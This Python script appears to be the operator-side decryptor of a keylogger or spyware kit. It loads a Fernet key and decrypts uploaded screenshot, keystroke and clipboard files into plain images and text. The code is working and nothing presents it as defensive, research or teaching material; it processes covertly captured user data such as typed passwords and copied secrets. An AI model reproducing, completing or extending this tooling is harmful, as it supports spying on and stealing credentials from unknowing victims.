import os
import json
from cryptography.fernet import Fernet
from PIL import Image
import io

# Base directories
SCREENSHOT_FOLDER = "Uploads/screenshot"
KEYLOG_FOLDER = "Uploads/keylogger"
CLIPBOARD_FOLDER = "Uploads/clipboard"

DECRYPTED_FOLDER = "DecryptedFiles"
DECRYPTED_SCREENSHOT_FOLDER = os.path.join(DECRYPTED_FOLDER, "screenshot")
DECRYPTED_KEYLOG_FOLDER = os.path.join(DECRYPTED_FOLDER, "keylogger")
DECRYPTED_CLIPBOARD_FOLDER = os.path.join(DECRYPTED_FOLDER, "clipboard")

# Load encryption key
def load_key():
    try:
        with open("secret.key", "rb") as key_file:
            return key_file.read()
    except Exception as e:
        print(f"Error loading key: {e}")
        raise

key = load_key()
cipher = Fernet(key)

def decrypt_file(file_path, file_type="screenshot"):
    """Decrypt a single file and save as image or text in the right subfolder."""
    if not os.path.exists(file_path):
        print(f"Error: The file '{file_path}' does not exist.")
        return

    # Determine output folder and extension
    folder_map = {
        "screenshot": DECRYPTED_SCREENSHOT_FOLDER,
        "keylog": DECRYPTED_KEYLOG_FOLDER,
        "clipboard": DECRYPTED_CLIPBOARD_FOLDER
    }
    extension_map = {
        "screenshot": ".jpg",
        "keylog": ".txt",
        "clipboard": ".txt"
    }

    output_folder = folder_map.get(file_type, DECRYPTED_FOLDER)
    output_ext = extension_map.get(file_type, ".txt")
    os.makedirs(output_folder, exist_ok=True)

    try:
        with open(file_path, "rb") as f:
            data = f.read()

        # Handle unencrypted screenshots
        if file_type == "screenshot":
            try:
                Image.open(io.BytesIO(data)).verify()
                print(f"Warning: File '{file_path}' is already an unencrypted image. Copying to DecryptedFiles.")
                output_path = os.path.join(output_folder, os.path.basename(file_path).replace('.bin', '.jpg'))
                with open(output_path, "wb") as f:
                    f.write(data)
                return
            except:
                pass  # Not a raw image

        # Decrypt
        try:
            decrypted_data = cipher.decrypt(data)
        except Exception as e:
            print(f"Error: File '{file_path}' is not encrypted or key is incorrect: {e}")
            return

        output_filename = os.path.basename(file_path).replace('.bin', output_ext)
        output_path = os.path.join(output_folder, output_filename)

        if file_type == "screenshot":
            with open(output_path, "wb") as f:
                f.write(decrypted_data)
            try:
                Image.open(output_path).verify()
                print(f"Decrypted and saved screenshot: {output_path}")
            except Exception as e:
                print(f"Error: Decrypted file '{output_path}' is not a valid image: {e}")
        else:
            try:
                json_data = json.loads(decrypted_data.decode())
                content = json_data["keystrokes"] if file_type == "keylog" else json_data["clipboard"]
                content_str = "".join(content) if isinstance(content, list) else content
                with open(output_path, "w", encoding="utf-8") as f:
                    f.write(content_str)
                print(f"Decrypted and saved {file_type}: {output_path}")
            except Exception as e:
                print(f"Error: Decrypted file '{output_path}' is not valid: {e}")
    except Exception as e:
        print(f"Error processing {file_path}: {e}")

def process_files():
    """Process all screenshot, keylog, and clipboard files."""
    print(f"Processing files...")
    os.makedirs(DECRYPTED_SCREENSHOT_FOLDER, exist_ok=True)
    os.makedirs(DECRYPTED_KEYLOG_FOLDER, exist_ok=True)
    os.makedirs(DECRYPTED_CLIPBOARD_FOLDER, exist_ok=True)

    # Process screenshots
    print(f"Processing screenshot files in {SCREENSHOT_FOLDER}...")
    if os.path.exists(SCREENSHOT_FOLDER):
        for filename in os.listdir(SCREENSHOT_FOLDER):
            if filename.endswith(".bin") or filename.endswith(".jpg"):
                file_path = os.path.join(SCREENSHOT_FOLDER, filename)
                decrypt_file(file_path, file_type="screenshot")
            else:
                print(f"Skipping file in screenshots: {filename}")
    else:
        print(f"Screenshot folder {SCREENSHOT_FOLDER} does not exist")

    # Process keylogs
    print(f"Processing keylog files in {KEYLOG_FOLDER}...")
    if os.path.exists(KEYLOG_FOLDER):
        for filename in os.listdir(KEYLOG_FOLDER):
            if filename.endswith(".bin"):
                file_path = os.path.join(KEYLOG_FOLDER, filename)
                decrypt_file(file_path, file_type="keylog")
            else:
                print(f"Skipping file in keylogs: {filename}")
    else:
        print(f"Keylog folder {KEYLOG_FOLDER} does not exist")

    # Process clipboard
    print(f"Processing clipboard files in {CLIPBOARD_FOLDER}...")
    if os.path.exists(CLIPBOARD_FOLDER):
        for filename in os.listdir(CLIPBOARD_FOLDER):
            if filename.endswith(".bin"):
                file_path = os.path.join(CLIPBOARD_FOLDER, filename)
                decrypt_file(file_path, file_type="clipboard")
            else:
                print(f"Skipping file in clipboard: {filename}")
    else:
        print(f"Clipboard folder {CLIPBOARD_FOLDER} does not exist")

if __name__ == "__main__":
    process_files()
